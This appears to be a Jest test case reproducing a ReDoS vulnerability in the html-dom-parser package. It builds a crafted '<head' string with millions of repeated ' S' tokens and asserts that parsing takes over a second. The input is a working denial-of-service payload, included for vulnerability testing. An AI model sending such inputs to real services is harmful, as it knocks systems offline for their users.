//https://github.com/remarkablemark/html-dom-parser/pull/8
test("ReDos in html-dom-parser", () => {
    const parse = require('html-dom-parser');
    const measureTime = require("./utils").measureTime;
    const genstr = require("./utils").genstr;
        
    let attack_str = '<head' + genstr(4000000,' S');
  
    let t = measureTime(function () {
        parse(attack_str);

    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });